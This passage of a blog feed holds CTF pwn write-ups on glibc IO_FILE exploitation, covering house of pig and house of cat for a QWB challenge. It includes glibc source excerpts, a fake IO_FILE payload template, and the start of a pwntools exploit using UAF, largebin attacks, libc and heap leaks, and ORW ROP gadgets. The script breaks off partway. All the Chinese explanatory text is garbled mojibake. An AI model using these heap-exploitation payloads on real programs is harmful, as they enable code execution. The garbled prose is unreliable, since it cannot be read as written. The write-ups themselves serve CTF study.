class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><blockquote><p>Êâìtcache stashingÊ≤°Êúâ<code>malloc</code>Âèñ‰∏çÂá∫chunkÊÄé‰πàÂäûÔºü</p><p>ÊàëÊúâ<code>_IO_str_overflow</code>ÔºÅÔºÅÔºÅÔºàËá™Ë±™Ôºâ</p></blockquote><p>Ëøô‰∏™ÂáΩÊï∞‰∏≠ÔºåÂÆåÁæéËææÊàê<code>malloc</code>„ÄÅ<code>memcpy</code>„ÄÅ<code>free</code>‰∏ÄÊù°ÈæôÊúçÂä°</p><p>‰ªÄ‰πàÔºü‰Ω†ÁöÑÁâàÊú¨Â§™È´òÊâì‰∏ç‰∫Ü<code>free_hook</code>Ôºü</p><p>Ê≤°ÂÖ≥Á≥ªÔºåÊúÄÂêéËøòÊúâ‰∏Ä‰∏™<code>memset</code>ÂèØ‰ª•ÂÜôlibc‰∏≠ÁöÑgotË°®</p><p>Â¶ÇÊûúÈúÄË¶ÅÊâìorwÔºå<code>rdx</code>‰πüÊòØÂèØÊéßÁöÑ</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p><p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p><p><code>rdi</code>ÊåáÂêë<code>_flags</code>Ôºå<code>rdi+0x28</code>ÊåáÂêë<code>_IO_write_ptr</code>ÔºåÂèØÊéß</p><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>Âè™ÈúÄË¶Å<strong>‰∏ÄÊ¨°</strong>‰ªªÊÑèÂÜôÔºÅ</p><p>Ë∞ÉÁî®ËôöË°®<code>_IO_wfile_jumps</code>‰∏≠ÁöÑ<code>_IO_wfile_seekoff</code>ÂáΩÊï∞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#ÈúÄË¶ÅÁªïËøáwas_writingÁöÑÊ£ÄÊµã</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊúÄÁªàÁõÆÁöÑÊòØË∞ÉÁî®<code>_IO_switch_to_wget_mode</code>ÂáΩÊï∞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">‚ñ∫ 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>ËøôÈáåcall‰∫Ü‰∏Ä‰∏™<code>rax</code>Áõ∏ÂÖ≥ÁöÑÂú∞ÂùÄÔºåËÄå<code>rax</code>Áî±<code>rdi</code>ÂÜ≥ÂÆö</p><p>ÂÜçËØ¥Ë∞ÉÁî®Êù°‰ª∂ÔºåÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™</p><ol><li><p><code>was_writing == 1</code></p><p>Âç≥fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p><p>ËøôÈáåÁî®Âà∞‰∫ÜÂâçÈù¢ÊèêÂà∞ÁöÑ<code>_wide_data</code>Ë∑≥Ë°®ÔºåÂèØ‰ª•Áõ¥Êé•‰º™ÈÄ†so easy</p></li><li><p><code>mode!=0</code></p><p><code>rcx</code>&#x3D;&gt;<code>mode</code></p><p>Â¶ÇÊûúÊó†Ê≥ïÊª°Ë∂≥ÔºåÂèØ‰ª•ÂÜçÂÅö‰∏Ä‰∏™FILEÁªìÊûÑ‰ΩìÔºåËøõÂÖ•Á¨¨‰∫å‰∏™ÁªìÊûÑ‰ΩìÊó∂Â∞±ÁΩÆÂ•Ω‰∫ÜÔºåËØ¶ÁªÜÂÜÖÂÆπÂèÇËÄÉ<a href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">PhotonÁöÑÂçöÂÆ¢</a></p></li></ol><p>ÊûÑÈÄ†Êå∫È∫ªÁÉ¶ÁöÑÔºåÁêÜËß£‰πãÂêéÂèØ‰ª•Áõ¥Êé•‰∏äÂà´‰∫∫ÁöÑÊ®°Êùø</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # ‰º™ÈÄ†ÁöÑfake_IOÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄ</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/house-of-cat/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p>]]></content>
    
    
    <summary type="html">IOFILEÈò∂ÊÆµÊÄßÂ≠¶‰π†ÊàêÊûúÊ±áÊä•Â§ß‰ºö</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>House of catÂº∫ÁΩëÊùØÂ§çÁé∞</title>
    <link href="http://deepunk.icu/house-of-cat/"/>
    <id>http://deepunk.icu/house-of-cat/</id>
    <published>2023-07-27T03:20:34.000Z</published>
    <updated>2023-12-14T15:12:03.231Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÊúÄÂêé‰∏ÄÂ§©ÁöÑÈ¢òÔºåÊ∞¥Ê∞¥</p></blockquote><h2 id="ÈÄÜÂêë"><a href="#ÈÄÜÂêë" class="headerlink" title="ÈÄÜÂêë"></a>ÈÄÜÂêë</h2><h3 id="Ê†ºÂºèÊ£ÄÊü•"><a href="#Ê†ºÂºèÊ£ÄÊü•" class="headerlink" title="Ê†ºÂºèÊ£ÄÊü•"></a>Ê†ºÂºèÊ£ÄÊü•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure><h3 id="ÂäüËÉΩÂàÜÊûê"><a href="#ÂäüËÉΩÂàÜÊûê" class="headerlink" title="ÂäüËÉΩÂàÜÊûê"></a>ÂäüËÉΩÂàÜÊûê</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>indexÂú®0Âà∞15Èó¥</p><p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p><p>‰ΩøÁî®calloc</p><h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>ÈôêÂà∂2Ê¨°</p><p>ÊØèÊ¨°Âè™ËÉΩ‰øÆÊîπ<strong>0x30</strong></p><h2 id="ÊîªÂáªÊµÅÁ®ãÂàÜÊûê"><a href="#ÊîªÂáªÊµÅÁ®ãÂàÜÊûê" class="headerlink" title="ÊîªÂáªÊµÅÁ®ãÂàÜÊûê"></a>ÊîªÂáªÊµÅÁ®ãÂàÜÊûê</h2><p>Áî±‰∫é‰∏çÂ≠òÂú®ÂØπexitÁöÑË∞ÉÁî®Ôºå‰∏îÂú®mainÂáΩÊï∞‰∏≠Êó†ÈôêÂæ™ÁéØÔºåÊïÖÊó†Ê≥ïËøõË°åFSOP</p><p>ÂèØ‰ª•ÈááÁî®house of kiwiÁöÑËß¶ÂèëIOÊÄùË∑ØÔºåÂà©Áî®<code>__malloc_assert</code>Ë∞ÉÁî®<code>fflush(stderr)</code>ÊàñËÄÖ<code>__fxprintf</code></p><p>ÊâÄ‰ª•ÈúÄË¶ÅÊîªÂáª‰Ωç‰∫éstderr‰∏äÁöÑÊåáÈíàÔºåÊÅ∞Â•ΩÊú¨È¢òËØ•Âú∞ÂùÄÂèØÂÜôÔºåËøôÈáå‰ΩøÁî®‰∏ÄÊ¨°largebin attack</p><p>Âè¶Â§ñÔºåË¶ÅËß¶Âèë<code>__malloc_assert</code>ÔºåÈúÄË¶Å‰øÆÊîπtopchunkÁöÑsize</p><p>Êú¨È¢òÁî±‰∫éeditÊúâÈïøÂ∫¶ÈôêÂà∂Ôºå‰∏çÊñπ‰æø‰ΩøÁî®‰πãÂâçÊûÑÈÄ†Â†ÜÈáçÂè†ÁöÑÊñπÂºèÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•Áî®Á¨¨‰∫åÊ¨°largebin attackÊîªÂáªsize</p><p>ÊÅ∞Â•ΩÂÖ±Êúâ‰∏§Ê¨°editÊú∫‰ºöÔºåÂàöÂ•ΩÁî®ÂÆåe</p><p>Âè¶Â§ñÔºåÊîªÂáªtop sizeÊó∂Ë¶ÅÊ≥®ÊÑèÔºåÂú®Â∞ÜÁ¨¨‰∫å‰∏™chunkÂä†ÂÖ•largebinÊó∂Ôºå‰∏çËÉΩÊîπÂèòtop chunkÁöÑ‰ΩçÁΩÆ„ÄÇ‰πüÂ∞±ÊòØËØ¥Ôºå‰∏çËÉΩÈÄöËøáÂàÜÈÖç‰∏Ä‰∏™Êõ¥Â§ßchunkÁöÑÊñπÂºèÊù•ÂæóÂà∞Á¨¨‰∫å‰∏™largechunk</p><p>ËøôÊòØÂõ†‰∏∫ÂØπlargebinËøõË°åunlinkÁöÑÊìç‰ΩúÂú®‰ªétopchunkÂàÜÈÖçchunk‰πãÂâçÔºåÊ≠§Êó∂‰øÆÊîπËøáÁöÑsize‰ºöË¢´Êñ∞ÁöÑsizeË¶ÜÁõñÊéâ„ÄÇ</p><p>ÊâÄ‰ª•Ëøô‰∏ÄÊ≠•ÂÖ•largebinÁöÑÊìç‰ΩúÔºåÂèØ‰ª•ÈÄöËøáÂàÜÈÖçÊõ¥Â∞èÁöÑchunkËé∑Âæó</p><p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p><p>ÂºÄ‰∫ÜÊ≤ôÁÆ±ÔºåÁ¶ÅÁî®‰∫ÜexecveÔºåÂπ∂Ê£ÄÊü•readÁöÑfdÊòØÂê¶‰∏∫0</p><p>ÊïÖÂè™ËÉΩÊâìorw, Âπ∂‰∏îÂú®openÂâçÈúÄË¶ÅÂÖàclose(0)</p><h2 id="Â†ÜÈ£éÊ∞¥"><a href="#Â†ÜÈ£éÊ∞¥" class="headerlink" title="Â†ÜÈ£éÊ∞¥"></a>Â†ÜÈ£éÊ∞¥</h2><p>ÈúÄË¶ÅËææÂà∞ÁöÑÊïàÊûúÊòØÔºö‰∏§Ê¨°largebin attackÔºåÂàÜÂà´‰ΩøstderrÊåáÂêëÂèØÊéßÂÜÖÂÆπÁöÑÂ†ÜÂùó„ÄÅ‰øÆÊîπtopchunk</p><p>Áúã‰ººÊØîËæÉÁÆÄÂçïÔºå‰ΩÜÈúÄÊ≥®ÊÑèeditÂè™ËÉΩ‰øÆÊîπ0x30Ôºå‰∏îÂè™Êúâ‰∏§Ê¨°Êú∫‰ºö</p><p>ÊâÄ‰ª•ÂØπ‰º™ÈÄ†ÁªìÊûÑ‰ΩìÂÜÖÂÆπÁöÑÂÜôÂÖ•ÈúÄË¶ÅÂú®addÊìç‰ΩúËøõË°åÔºåÂÖ•largebin‰πãÂêéÂØπÂâç6‰∏™Âú∞ÂùÄ‰ºöÊúâË¶ÜÁõñÔºåÂÆûÊµã‰∏ãÊù•ÂØπIOÂà©Áî®Ê≤°ÊúâÂΩ±Âìç</p><h2 id="IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê"><a href="#IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê" class="headerlink" title="IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê"></a>IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p><p>1.Â∞Ü[rdi+0xa0]<code>_wide_data</code>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôraxÔºå‰∏∫‰∫ÜÈÅøÂÖç‰∏é‰∏ãÈù¢ÁöÑraxÊ∑∑Ê∑ÜÔºåÁß∞‰πã‰∏∫<strong>rax1</strong>„ÄÇ<br>2.Â∞ÜÊñ∞ËµãÂÄºÁöÑ[rax1+0x20]<code>_IO_backup_base</code>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôrdx„ÄÇ<br>3.Â∞Ü[rax1+0xe0]</p><p>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôraxÔºåÁß∞‰πã‰∏∫<strong>rax2</strong>„ÄÇ<br>4.callË∞ÉÁî®[rax2+0x18]Â§ÑÁöÑÂÜÖÂÆπ„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ÔºÅ=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#Â¶ÇÊûú_wide_data=fake_io_addr+<span class="number">0x30</span>ÔºåÂÖ∂ÂÆû‰πüÂ∞±ÊòØfp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lockÊòØ‰∏Ä‰∏™ÂèØÂÜôÂú∞ÂùÄÔºàÂ†ÜÂú∞ÂùÄ„ÄÅlibc‰∏≠ÁöÑÂèØÂÜôÂú∞ÂùÄ</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span 